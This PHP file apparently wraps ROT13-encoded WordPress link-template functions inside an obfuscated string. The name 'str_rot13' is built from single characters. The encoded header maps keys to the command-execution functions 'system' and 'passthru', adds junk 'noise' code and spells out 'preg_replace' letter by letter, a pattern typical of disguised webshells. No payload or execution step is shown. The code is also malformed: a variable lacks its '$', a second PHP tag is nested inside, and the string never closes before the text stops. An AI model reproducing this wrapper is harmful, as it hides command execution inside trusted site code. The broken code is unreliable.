<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JbeqCerff Yvax Grzcyngr Shapgvbaf
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Grzcyngr
 */

/**
 * Qvfcynlf gur creznyvax sbe gur pheerag cbfg.
 *
 * @fvapr 1.2.0
 * @fvapr 4.4.0 Nqqrq gur `$cbfg` cnenzrgre.
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhyg vf gur tybony `$cbfg`.
 */
shapgvba gur_creznyvax( $cbfg = 0 ) {
	/**
	 * Svygref gur qvfcynl bs gur creznyvax sbe gur pheerag cbfg.
	 *
	 * @fvapr 1.5.0
	 * @fvapr 4.4.0 Nqqrq gur `$cbfg` cnenzrgre.
	 *
	 * @cnenz fgevat      $creznyvax Gur creznyvax sbe gur pheerag cbfg.
	 * @cnenz vag|JC_Cbfg $cbfg      Cbfg VQ, JC_Cbfg bowrpg, be 0. Qrsnhyg 0.
	 */
	rpub rfp_hey( nccyl_svygref( 'gur_creznyvax', trg_creznyvax( $cbfg ), $cbfg ) );
}

/**
 * Ergevrirf n genvyvat-fynfurq fgevat vs gur fvgr vf frg sbe nqqvat genvyvat fynfurf.
 *
 * Pbaqvgvbanyyl nqqf n genvyvat fynfu vs gur creznyvax fgehpgher unf n genvyvat
 * fynfu, fgevcf gur genvyvat fynfu vs abg. Gur fgevat vf cnffrq guebhtu gur
 * {@frr 'hfre_genvyvatfynfuvg'} svygre. Jvyy erzbir genvyvat fynfu sebz fgevat, vs
 * fvgr vf abg frg gb unir gurz.
 *
 * @fvapr 2.2.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz fgevat $hey         HEY jvgu be jvgubhg n genvyvat fynfu.
 * @cnenz fgevat $glcr_bs_hey Bcgvbany. Gur glcr bs HEY orvat pbafvqrerq (r.t. fvatyr, pngrtbel, rgp)
 *                            sbe hfr va gur svygre. Qrsnhyg rzcgl fgevat.
 * @erghea fgevat Gur HEY jvgu gur genvyvat fynfu nccraqrq be fgevccrq.
 */
shapgvba hfre_genvyvatfynfuvg( $hey, $glcr_bs_hey = '' ) {
	tybony $jc_erjevgr;
	vs ( $jc_erjevgr->hfr_genvyvat_fynfurf ) {
		$hey = genvyvatfynfuvg( $hey );
	} ryfr {
		$hey = hagenvyvatfynfuvg( $hey );
	}

	/**
	 * Svygref gur genvyvat-fynfurq fgevat, qrcraqvat ba jurgure gur fvgr vf frg gb hfr genvyvat fynfurf.
	 *
	 * @fvapr 2.2.0
	 *
	 * @cnenz fgevat $hey         HEY jvgu be jvgubhg n genvyvat fynfu.
	 * @cnenz fgevat $glcr_bs_hey Gur glcr bs HEY orvat pbafvqrerq. Npprcgf 'fvatyr', 'fvatyr_genpxonpx',
	 *                            'fvatyr_srrq', 'fvatyr_cntrq', 'pbzzragcntrq', 'cntrq', 'ubzr', 'srrq',
	 *                            'pngrtbel', 'cntr', 'lrne', 'zbagu', 'qnl', 'cbfg_glcr_nepuvir'.
	 */
	erghea nccyl_svygref( 'hfre_genvyvatfynfuvg', $hey, $glcr_bs_hey );
}

/**
 * Qvfcynlf gur creznyvax napube sbe gur pheerag cbfg.
 *
 * Gur creznyvax zbqr gvgyr jvyy hfr gur cbfg gvgyr sbe gur 'n' ryrzrag 'vq'
 * nggevohgr. Gur vq zbqr hfrf 'cbfg-' jvgu gur cbfg VQ sbe gur 'vq' nggevohgr.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $zbqr Bcgvbany. Creznyvax zbqr. Npprcgf 'gvgyr' be 'vq'. Qrsnhyg 'vq'.
 */
shapgvba creznyvax_napube( $zbqr = 'vq' ) {
	$cbfg = trg_cbfg();
	fjvgpu ( fgegbybjre( $zbqr ) ) {
		pnfr 'gvgyr':
			$gvgyr = fnavgvmr_gvgyr( $cbfg->cbfg_gvgyr ) . '-' . $cbfg->VQ;
			rpub '<n vq=\"' . $gvgyr . '\"></n>';
			oernx;
		pnfr 'vq':
		qrsnhyg:
			rpub '<n vq=\"cbfg-' . $cbfg->VQ . '\"></n>';
			oernx;
	}
}

/**
 * Qrgrezvar jurgure cbfg fubhyq nyjnlf hfr n cynva creznyvax fgehpgher.
 *
 * @fvapr 5.7.0
 *
 * @cnenz JC_Cbfg|vag|ahyy $cbfg   Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhygf gb tybony $cbfg.
 * @cnenz obby|ahyy        $fnzcyr Bcgvbany. Jurgure gb sbepr pbafvqrengvba onfrq ba fnzcyr yvaxf.
 *                                 Vs bzvggrq, n fnzcyr yvax vf trarengrq vs n cbfg bowrpg vf cnffrq
 *                                 jvgu gur svygre cebcregl frg gb 'fnzcyr'.
 * @erghea obby Jurgure gb hfr n cynva creznyvax fgehpgher.
 */
shapgvba jc_sbepr_cynva_cbfg_creznyvax( $cbfg = ahyy, $fnzcyr = ahyy ) {
	vs (
		ahyy === $fnzcyr &&
		vf_bowrpg( $cbfg ) &&
		vffrg( $cbfg->svygre ) &&
		'fnzcyr' === $cbfg->svygre
	) {
		$fnzcyr = gehr;
	} ryfr {
		$cbfg   = trg_cbfg( $cbfg );
		$fnzcyr = ahyy !== $fnzcyr ? $fnzcyr : snyfr;
	}

	vs ( ! $cbfg ) {
		erghea gehr;
	}

	$cbfg_fgnghf_bow = trg_cbfg_fgnghf_bowrpg( trg_cbfg_fgnghf( $cbfg ) );
	$cbfg_glcr_bow   = trg_cbfg_glcr_bowrpg( trg_cbfg_glcr( $cbfg ) );

	vs ( ! $cbfg_fgnghf_bow || ! $cbfg_glcr_bow ) {
		erghea gehr;
	}

	vs (
		// Choyvpyl ivrjnoyr yvaxf arire unir cynva creznyvaxf.
		vf_cbfg_fgnghf_ivrjnoyr( $cbfg_fgnghf_bow ) ||
		(
			// Cevingr cbfgf qba'g unir cynva creznyvaxf vs gur hfre pna ernq gurz.
			$cbfg_fgnghf_bow->cevingr &&
			pheerag_hfre_pna( 'ernq_cbfg', $cbfg->VQ )
		) ||
		// Cebgrpgrq cbfgf qba'g unir cynva yvaxf vs trggvat n fnzcyr HEY.
		( $cbfg_fgnghf_bow->cebgrpgrq && $fnzcyr )
	) {
		erghea snyfr;
	}

	erghea gehr;
}

/**
 * Ergevrirf gur shyy creznyvax sbe gur pheerag cbfg be cbfg VQ.
 *
 * Guvf shapgvba vf na nyvnf sbe trg_creznyvax().
 *
 * @fvapr 3.9.0
 *
 * @frr trg_creznyvax()
 *
 * @cnenz vag|JC_Cbfg $cbfg      Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhyg vf gur tybony `$cbfg`.
 * @cnenz obby        $yrniranzr Bcgvbany. Jurgure gb xrrc cbfg anzr be cntr anzr. Qrsnhyg snyfr.
 * @erghea fgevat|snyfr Gur creznyvax HEY. Snyfr vs gur cbfg qbrf abg rkvfg.
 */
shapgvba trg_gur_creznyvax( $cbfg = 0, $yrniranzr = snyfr ) {
	erghea trg_creznyvax( $cbfg, $yrniranzr );
}

/**
 * Ergevrirf gur shyy creznyvax sbe gur pheerag cbfg be cbfg VQ.
 *
 * @fvapr 1.0.0
 *
 * @cnenz vag|JC_Cbfg $cbfg      Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhyg vf gur tybony `$cbfg`.
 * @cnenz obby        $yrniranzr Bcgvbany. Jurgure gb xrrc cbfg anzr be cntr anzr. Qrsnhyg snyfr.
 * @erghea fgevat|snyfr Gur creznyvax HEY. Snyfr vs gur cbfg qbrf abg rkvfg.
 */
shapgvba trg_creznyvax( $cbfg = 0, $yrniranzr = snyfr ) {
	$erjevgrpbqr = neenl(
		'%lrne%',
		'%zbaguahz%',
		'%qnl%',
		'%ubhe%',
		'%zvahgr%',
		'%frpbaq%',
		$yrniranzr ? '' : '%cbfganzr%',
		'%cbfg_vq%',
		'%pngrtbel%',
		'%nhgube%',
		$yrniranzr ? '' : '%cntranzr%',
	);

	vs ( vf_bowrpg( $cbfg ) && vffrg( $cbfg->svygre ) && 'fnzcyr' === $cbfg->svygre ) {
		$fnzcyr = gehr;
	} ryfr {
		$cbfg   = trg_cbfg( $cbfg );
		$fnzcyr = snyfr;
	}

	vs ( rzcgl( $cbfg->VQ ) ) {
		erghea snyfr;
	}

	vs ( 'cntr' === $cbfg->cbfg_glcr ) {
		erghea trg_cntr_yvax( $cbfg, $yrniranzr, $fnzcyr );
	} ryfrvs ( 'nggnpuzrag' === $cbfg->cbfg_glcr ) {
		erghea trg_nggnpuzrag_yvax( $cbfg, $yrniranzr );
	} ryfrvs ( va_neenl( $cbfg->cbfg_glcr, trg_cbfg_glcrf( neenl( '_ohvygva' => snyfr ) ), gehr ) ) {
		erghea trg_cbfg_creznyvax( $cbfg, $yrniranzr, $fnzcyr );
	}

	$creznyvax = trg_bcgvba( 'creznyvax_fgehpgher' );

	/**
	 * Svygref gur creznyvax fgehpgher sbe n cbfg orsber gbxra ercynprzrag bpphef.
	 *
	 * Bayl nccyvrf gb cbfgf jvgu cbfg_glcr bs 'cbfg'.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat  $creznyvax Gur fvgr'f creznyvax fgehpgher.
	 * @cnenz JC_Cbfg $cbfg      Gur cbfg va dhrfgvba.
	 * @cnenz obby    $yrniranzr Jurgure gb xrrc gur cbfg anzr.
	 */
	$creznyvax = nccyl_svygref( 'cer_cbfg_yvax', $creznyvax, $cbfg, $yrniranzr );

	vs (
		$creznyvax &&
		! jc_sbepr_cynva_cbfg_creznyvax( $cbfg )
	) {

		$pngrtbel = '';
		vs ( fge_pbagnvaf( $creznyvax, '%pngrtbel%' ) ) {
			$pngf = trg_gur_pngrtbel( $cbfg->VQ );
			vs ( $pngf ) {
				$pngf = jc_yvfg_fbeg(
					$pngf,
					neenl(
						'grez_vq' => 'NFP',
					)
				);

				/**
				 * Svygref gur pngrtbel gung trgf hfrq va gur %pngrtbel% creznyvax gbxra.
				 *
				 * @fvapr 3.5.0
				 *
				 * @cnenz JC_Grez  $png  Gur pngrtbel gb hfr va gur creznyvax.
				 * @cnenz neenl    $pngf Neenl bs nyy pngrtbevrf (JC_Grez bowrpgf) nffbpvngrq jvgu gur cbfg.
				 * @cnenz JC_Cbfg  $cbfg Gur cbfg va dhrfgvba.
				 */
				$pngrtbel_bowrpg = nccyl_svygref( 'cbfg_yvax_pngrtbel', $pngf[0], $pngf, $cbfg );

				$pngrtbel_bowrpg = trg_grez( $pngrtbel_bowrpg, 'pngrtbel' );
				$pngrtbel        = $pngrtbel_bowrpg->fyht;
				vs ( $pngrtbel_bowrpg->cnerag ) {
					$pngrtbel = trg_pngrtbel_cneragf( $pngrtbel_bowrpg->cnerag, snyfr, '/', gehr ) . $pngrtbel;
				}
			}
			/*
			 * Fubj qrsnhyg pngrtbel va creznyvaxf,
			 * jvgubhg univat gb nffvta vg rkcyvpvgyl.
			 */
			vs ( rzcgl( $pngrtbel ) ) {
				$qrsnhyg_pngrtbel = trg_grez( trg_bcgvba( 'qrsnhyg_pngrtbel' ), 'pngrtbel' );
				vs ( $qrsnhyg_pngrtbel && ! vf_jc_reebe( $qrsnhyg_pngrtbel ) ) {
					$pngrtbel = $qrsnhyg_pngrtbel->fyht;
				}
			}
		}

		$nhgube = '';
		vs ( fge_pbagnvaf( $creznyvax, '%nhgube%' ) ) {
			$nhgubeqngn = trg_hfreqngn( $cbfg->cbfg_nhgube );
			$nhgube     = $nhgubeqngn->hfre_avpranzr;
		}

		/*
		 * Guvf vf abg na NCV pnyy orpnhfr gur creznyvax vf onfrq ba gur fgberq cbfg_qngr inyhr,
		 * juvpu fubhyq or cnefrq nf ybpny gvzr ertneqyrff bs gur qrsnhyg CUC gvzrmbar.
		 */
		$qngr = rkcybqr( ' ', fge_ercynpr( neenl( '-', ':' ), ' ', $cbfg->cbfg_qngr ) );

		$erjevgrercynpr = neenl(
			$qngr[0],
			$qngr[1],
			$qngr[2],
			$qngr[3],
			$qngr[4],
			$qngr[5],
			$cbfg->cbfg_anzr,
			$cbfg->VQ,
			$pngrtbel,
			$nhgube,
			$cbfg->cbfg_anzr,
		);

		$creznyvax = ubzr_hey( fge_ercynpr( $erjevgrpbqr, $erjevgrercynpr, $creznyvax ) );
		$creznyvax = hfre_genvyvatfynfuvg( $creznyvax, 'fvatyr' );

	} ryfr { // Vs gurl'er abg hfvat gur snapl creznyvax bcgvba.
		$creznyvax = ubzr_hey( '?c=' . $cbfg->VQ );
	}

	/**
	 * Svygref gur creznyvax sbe n cbfg.
	 *
	 * Bayl nccyvrf gb cbfgf jvgu cbfg_glcr bs 'cbfg'.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat  $creznyvax Gur cbfg'f creznyvax.
	 * @cnenz JC_Cbfg $cbfg      Gur cbfg va dhrfgvba.
	 * @cnenz obby    $yrniranzr Jurgure gb xrrc gur cbfg anzr.
	 */
	erghea nccyl_svygref( 'cbfg_yvax', $creznyvax, $cbfg, $yrniranzr );
}

/**
 * Ergevrirf gur creznyvax sbe n cbfg bs n phfgbz cbfg glcr.
 *
 * @fvapr 3.0.0
 * @fvapr 6.1.0 Ergheaf snyfr vs gur cbfg qbrf abg rkvfg.
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz vag|JC_Cbfg $cbfg      Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhyg vf gur tybony `$cbfg`.
 * @cnenz obby        $yrniranzr Bcgvbany. Jurgure gb xrrc cbfg anzr. Qrsnhyg snyfr.
 * @cnenz obby        $fnzcyr    Bcgvbany. Vf vg n fnzcyr creznyvax. Qrsnhyg snyfr.
 * @erghea fgevat|snyfr Gur cbfg creznyvax HEY. Snyfr vs gur cbfg qbrf abg rkvfg.
 */
shapgvba trg_cbfg_creznyvax( $cbfg = 0, $yrniranzr = snyfr, $fnzcyr = snyfr ) {
	tybony $jc_erjevgr;

	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	$cbfg_yvax = $jc_erjevgr->trg_rkgen_creznfgehpg( $cbfg->cbfg_glcr );

	$fyht = $cbfg->cbfg_anzr;

	$sbepr_cynva_yvax = jc_sbepr_cynva_cbfg_creznyvax( $cbfg );

	$cbfg_glcr = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );

	vs ( $cbfg_glcr->uvrenepuvpny ) {
		$fyht = trg_cntr_hev( $cbfg );
	}

	vs ( ! rzcgl( $cbfg_yvax ) && ( ! $sbepr_cynva_yvax || $fnzcyr ) ) {
		vs ( ! $yrniranzr ) {
			$cbfg_yvax = fge_ercynpr( \"%$cbfg->cbfg_glcr%\", $fyht, $cbfg_yvax );
		}
		$cbfg_yvax = ubzr_hey( hfre_genvyvatfynfuvg( $cbfg_yvax ) );
	} ryfr {
		vs ( $cbfg_glcr->dhrel_ine && ( vffrg( $cbfg->cbfg_fgnghf ) && ! $sbepr_cynva_yvax ) ) {
			$cbfg_yvax = nqq_dhrel_net( $cbfg_glcr->dhrel_ine, $fyht, '' );
		} ryfr {
			$cbfg_yvax = nqq_dhrel_net(
				neenl(
					'cbfg_glcr' => $cbfg->cbfg_glcr,
					'c'         => $cbfg->VQ,
				),
				''
			);
		}
		$cbfg_yvax = ubzr_hey( $cbfg_yvax );
	}

	/**
	 * Svygref gur creznyvax sbe n cbfg bs n phfgbz cbfg glcr.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat  $cbfg_yvax Gur cbfg'f creznyvax.
	 * @cnenz JC_Cbfg $cbfg      Gur cbfg va dhrfgvba.
	 * @cnenz obby    $yrniranzr Jurgure gb xrrc gur cbfg anzr.
	 * @cnenz obby    $fnzcyr    Vf vg n fnzcyr creznyvax.
	 */
	erghea nccyl_svygref( 'cbfg_glcr_yvax', $cbfg_yvax, $cbfg, $yrniranzr, $fnzcyr );
}

/**
 * Ergevrirf gur creznyvax sbe gur pheerag cntr be cntr VQ.
 *
 * Erfcrpgf cntr_ba_sebag. Hfr guvf bar.
 *
 * @fvapr 1.5.0
 *
 * @cnenz vag|JC_Cbfg $cbfg      Bcgvbany. Cbfg VQ be bowrpg. Qrsnhyg hfrf gur tybony `$cbfg`.
 * @cnenz obby        $yrniranzr Bcgvbany. Jurgure gb xrrc gur cntr anzr. Qrsnhyg snyfr.
 * @cnenz obby        $fnzcyr    Bcgvbany. Jurgure vg fubhyq or gerngrq nf n fnzcyr creznyvax.
 *                               Qrsnhyg snyfr.
 * @erghea fgevat Gur cntr creznyvax.
 */
shapgvba trg_cntr_yvax( $cbfg = 0, $yrniranzr = snyfr, $fnzcyr = snyfr ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( 'cntr' === trg_bcgvba( 'fubj_ba_sebag' ) && (vag) trg_bcgvba( 'cntr_ba_sebag' ) === $cbfg->VQ ) {
		$yvax = ubzr_hey( '/' );
	} ryfr {
		$yvax = _trg_cntr_yvax( $cbfg, $yrniranzr, $fnzcyr );
	}

	/**
	 * Svygref gur creznyvax sbe n cntr.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat $yvax    Gur cntr'f creznyvax.
	 * @cnenz vag    $cbfg_vq Gur VQ bs gur cntr.
	 * @cnenz obby   $fnzcyr  Vf vg n fnzcyr creznyvax.
	 */
	erghea nccyl_svygref( 'cntr_yvax', $yvax, $cbfg->VQ, $fnzcyr );
}

/**
 * Ergevrirf gur cntr creznyvax.
 *
 * Vtaberf cntr_ba_sebag. Vagreany hfr bayl.
 *
 * @fvapr 2.1.0
 * @npprff cevingr
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz vag|JC_Cbfg $cbfg      Bcgvbany. Cbfg VQ be bowrpg. Qrsnhyg hfrf gur tybony `$cbfg`.
 * @cnenz obby        $yrniranzr Bcgvbany. Jurgure gb xrrc gur cntr anzr. Qrsnhyg snyfr.
 * @cnenz obby        $fnzcyr    Bcgvbany. Jurgure vg fubhyq or gerngrq nf n fnzcyr creznyvax.
 *                               Qrsnhyg snyfr.
 * @erghea fgevat Gur cntr creznyvax.
 */
shapgvba _trg_cntr_yvax( $cbfg = 0, $yrniranzr = snyfr, $fnzcyr = snyfr ) {
	tybony $jc_erjevgr;

	$cbfg = trg_cbfg( $cbfg );

	$sbepr_cynva_yvax = jc_sbepr_cynva_cbfg_creznyvax( $cbfg );

	$yvax = $jc_erjevgr->trg_cntr_creznfgehpg();

	vs ( ! rzcgl( $yvax ) && ( ( vffrg( $cbfg->cbfg_fgnghf ) && ! $sbepr_cynva_yvax ) || $fnzcyr ) ) {
		vs ( ! $yrniranzr ) {
			$yvax = fge_ercynpr( '%cntranzr%', trg_cntr_hev( $cbfg ), $yvax );
		}

		$yvax = ubzr_hey( $yvax );
		$yvax = hfre_genvyvatfynfuvg( $yvax, 'cntr' );
	} ryfr {
		$yvax = ubzr_hey( '?cntr_vq=' . $cbfg->VQ );
	}

	/**
	 * Svygref gur creznyvax sbe n aba-cntr_ba_sebag cntr.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat $yvax    Gur cntr'f creznyvax.
	 * @cnenz vag    $cbfg_vq Gur VQ bs gur cntr.
	 */
	erghea nccyl_svygref( '_trg_cntr_yvax', $yvax, $cbfg->VQ );
}

/**
 * Ergevrirf gur creznyvax sbe na nggnpuzrag.
 *
 * Guvf pna or hfrq va gur JbeqCerff Ybbc be bhgfvqr bs vg.
 *
 * @fvapr 2.0.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz vag|JC_Cbfg $cbfg      Bcgvbany. Cbfg VQ be bowrpg. Qrsnhyg hfrf gur tybony `$cbfg`.
 * @cnenz obby        $yrniranzr Bcgvbany. Jurgure gb xrrc gur cntr anzr. Qrsnhyg snyfr.
 * @erghea fgevat Gur nggnpuzrag creznyvax.
 */
shapgvba trg_nggnpuzrag_yvax( $cbfg = ahyy, $yrniranzr = snyfr ) {
	tybony $jc_erjevgr;

	$yvax = snyfr;

	$cbfg             = trg_cbfg( $cbfg );
	$sbepr_cynva_yvax = jc_sbepr_cynva_cbfg_creznyvax( $cbfg );
	$cnerag_vq        = $cbfg->cbfg_cnerag;
	$cnerag           = $cnerag_vq ? trg_cbfg( $cnerag_vq ) : snyfr;
	$cnerag_inyvq     = gehr; // Qrsnhyg sbe ab cnerag.
	vs (
		$cnerag_vq &&
		(
			$cbfg->cbfg_cnerag === $cbfg->VQ ||
			! $cnerag ||
			! vf_cbfg_glcr_ivrjnoyr( trg_cbfg_glcr( $cnerag ) )
		)
	) {
		// Cbfg vf rvgure vgf bja cnerag be cnerag cbfg haninvynoyr.
		$cnerag_inyvq = snyfr;
	}

	vs ( $sbepr_cynva_yvax || ! $cnerag_inyvq ) {
		$yvax = snyfr;
	} ryfrvs ( $jc_erjevgr->hfvat_creznyvaxf() && $cnerag ) {
		vs ( 'cntr' === $cnerag->cbfg_glcr ) {
			$cneragyvax = _trg_cntr_yvax( $cbfg->cbfg_cnerag ); // Vtaberf cntr_ba_sebag.
		} ryfr {
			$cneragyvax = trg_creznyvax( $cbfg->cbfg_cnerag );
		}

		vs ( vf_ahzrevp( $cbfg->cbfg_anzr ) || fge_pbagnvaf( trg_bcgvba( 'creznyvax_fgehpgher' ), '%pngrtbel%' ) ) {
			$anzr = 'nggnpuzrag/' . $cbfg->cbfg_anzr; // <creznyvax>/<vag>/ vf cntrq fb jr hfr gur rkcyvpvg nggnpuzrag znexre.
		} ryfr {
			$anzr = $cbfg->cbfg_anzr;
		}

		vs ( ! fge_pbagnvaf( $cneragyvax, '?' ) ) {
			$yvax = hfre_genvyvatfynfuvg( genvyvatfynfuvg( $cneragyvax ) . '%cbfganzr%' );
		}

		vs ( ! $yrniranzr ) {
			$yvax = fge_ercynpr( '%cbfganzr%', $anzr, $yvax );
		}
	} ryfrvs ( $jc_erjevgr->hfvat_creznyvaxf() && ! $yrniranzr ) {
		$yvax = ubzr_hey( hfre_genvyvatfynfuvg( $cbfg->cbfg_anzr ) );
	}

	vs ( ! $yvax ) {
		$yvax = ubzr_hey( '/?nggnpuzrag_vq=' . $cbfg->VQ );
	}

	/**
	 * Svygref gur creznyvax sbe na nggnpuzrag.
	 *
	 * @fvapr 2.0.0
	 * @fvapr 5.6.0 Cebivqvat na rzcgl fgevat jvyy abj qvfnoyr
	 *              gur ivrj nggnpuzrag cntr yvax ba gur zrqvn zbqny.
	 *
	 * @cnenz fgevat $yvax    Gur nggnpuzrag'f creznyvax.
	 * @cnenz vag    $cbfg_vq Nggnpuzrag VQ.
	 */
	erghea nccyl_svygref( 'nggnpuzrag_yvax', $yvax, $cbfg->VQ );
}

/**
 * Ergevrirf gur creznyvax sbe gur lrne nepuvirf.
 *
 * @fvapr 1.5.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz vag|snyfr $lrne Vagrtre bs lrne. Snyfr sbe pheerag lrne.
 * @erghea fgevat Gur creznyvax sbe gur fcrpvsvrq lrne nepuvir.
 */
shapgvba trg_lrne_yvax( $lrne ) {
	tybony $jc_erjevgr;
	vs ( ! $lrne ) {
		$lrne = pheerag_gvzr( 'L' );
	}
	$lrneyvax = $jc_erjevgr->trg_lrne_creznfgehpg();
	vs ( ! rzcgl( $lrneyvax ) ) {
		$lrneyvax = fge_ercynpr( '%lrne%', $lrne, $lrneyvax );
		$lrneyvax = ubzr_hey( hfre_genvyvatfynfuvg( $lrneyvax, 'lrne' ) );
	} ryfr {
		$lrneyvax = ubzr_hey( '?z=' . $lrne );
	}

	/**
	 * Svygref gur lrne nepuvir creznyvax.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat $lrneyvax Creznyvax sbe gur lrne nepuvir.
	 * @cnenz vag    $lrne     Lrne sbe gur nepuvir.
	 */
	erghea nccyl_svygref( 'lrne_yvax', $lrneyvax, $lrne );
}

/**
 * Ergevrirf gur creznyvax sbe gur zbagu nepuvirf jvgu lrne.
 *
 * @fvapr 1.0.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz vag|snyfr $lrne  Vagrtre bs lrne. Snyfr sbe pheerag lrne.
 * @cnenz vag|snyfr $zbagu Vagrtre bs zbagu. Snyfr sbe pheerag zbagu.
 * @erghea fgevat Gur creznyvax sbe gur fcrpvsvrq zbagu naq lrne nepuvir.
 */
shapgvba trg_zbagu_yvax( $lrne, $zbagu ) {
	tybony $jc_erjevgr;
	vs ( ! $lrne ) {
		$lrne = pheerag_gvzr( 'L' );
	}
	vs ( ! $zbagu ) {
		$zbagu = pheerag_gvzr( 'z' );
	}
	$zbaguyvax = $jc_erjevgr->trg_zbagu_creznfgehpg();
	vs ( ! rzcgl( $zbaguyvax ) ) {
		$zbaguyvax = fge_ercynpr( '%lrne%', $lrne, $zbaguyvax );
		$zbaguyvax = fge_ercynpr( '%zbaguahz%', mrebvfr( (vag) $zbagu, 2 ), $zbaguyvax );
		$zbaguyvax = ubzr_hey( hfre_genvyvatfynfuvg( $zbaguyvax, 'zbagu' ) );
	} ryfr {
		$zbaguyvax = ubzr_hey( '?z=' . $lrne . mrebvfr( $zbagu, 2 ) );
	}

	/**
	 * Svygref gur zbagu nepuvir creznyvax.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat $zbaguyvax Creznyvax sbe gur zbagu nepuvir.
	 * @cnenz vag    $lrne      Lrne sbe gur nepuvir.
	 * @cnenz vag    $zbagu     Gur zbagu sbe gur nepuvir.
	 */
	erghea nccyl_svygref( 'zbagu_yvax', $zbaguyvax, $lrne, $zbagu );
}

/**
 * Ergevrirf gur creznyvax sbe gur qnl nepuvirf jvgu lrne naq zbagu.
 *
 * @fvapr 1.0.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz vag|snyfr $lrne  Vagrtre bs lrne. Snyfr sbe pheerag lrne.
 * @cnenz vag|snyfr $zbagu Vagrtre bs zbagu. Snyfr sbe pheerag zbagu.
 * @cnenz vag|snyfr $qnl   Vagrtre bs qnl. Snyfr sbe pheerag qnl.
 * @erghea fgevat Gur creznyvax sbe gur fcrpvsvrq qnl, zbagu, naq lrne nepuvir.
 */
shapgvba trg_qnl_yvax( $lrne, $zbagu, $qnl ) {
	tybony $jc_erjevgr;
	vs ( ! $lrne ) {
		$lrne = pheerag_gvzr( 'L' );
	}
	vs ( ! $zbagu ) {
		$zbagu = pheerag_gvzr( 'z' );
	}
	vs ( ! $qnl ) {
		$qnl = pheerag_gvzr( 'w' );
	}

	$qnlyvax = $jc_erjevgr->trg_qnl_creznfgehpg();
	vs ( ! rzcgl( $qnlyvax ) ) {
		$qnlyvax = fge_ercynpr( '%lrne%', $lrne, $qnlyvax );
		$qnlyvax = fge_ercynpr( '%zbaguahz%', mrebvfr( (vag) $zbagu, 2 ), $qnlyvax );
		$qnlyvax = fge_ercynpr( '%qnl%', mrebvfr( (vag) $qnl, 2 ), $qnlyvax );
		$qnlyvax = ubzr_hey( hfre_genvyvatfynfuvg( $qnlyvax, 'qnl' ) );
	} ryfr {
		$qnlyvax = ubzr_hey( '?z=' . $lrne . mrebvfr( $zbagu, 2 ) . mrebvfr( $qnl, 2 ) );
	}

	/**
	 * Svygref gur qnl nepuvir creznyvax.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat $qnlyvax Creznyvax sbe gur qnl nepuvir.
	 * @cnenz vag    $lrne    Lrne sbe gur nepuvir.
	 * @cnenz vag    $zbagu   Zbagu sbe gur nepuvir.
	 * @cnenz vag    $qnl     Gur qnl sbe gur nepuvir.
	 */
	erghea nccyl_svygref( 'qnl_yvax', $qnlyvax, $lrne, $zbagu, $qnl );
}

/**
 * Qvfcynlf gur creznyvax sbe gur srrq glcr.
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat $napube Gur yvax'f napube grkg.
 * @cnenz fgevat $srrq   Bcgvbany. Srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
 *                       Qrsnhyg vf gur inyhr bs trg_qrsnhyg_srrq().
 */
shapgvba gur_srrq_yvax( $napube, $srrq = '' ) {
	$yvax = '<n uers=\"' . rfp_hey( trg_srrq_yvax( $srrq ) ) . '\">' . $napube . '</n>';

	/**
	 * Svygref gur srrq yvax napube gnt.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $yvax Gur pbzcyrgr napube gnt sbe n srrq yvax.
	 * @cnenz fgevat $srrq Gur srrq glcr. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz',
	 *                     be na rzcgl fgevat sbe gur qrsnhyg srrq glcr.
	 */
	rpub nccyl_svygref( 'gur_srrq_yvax', $yvax, $srrq );
}

/**
 * Ergevrirf gur creznyvax sbe gur srrq glcr.
 *
 * @fvapr 1.5.0
 *
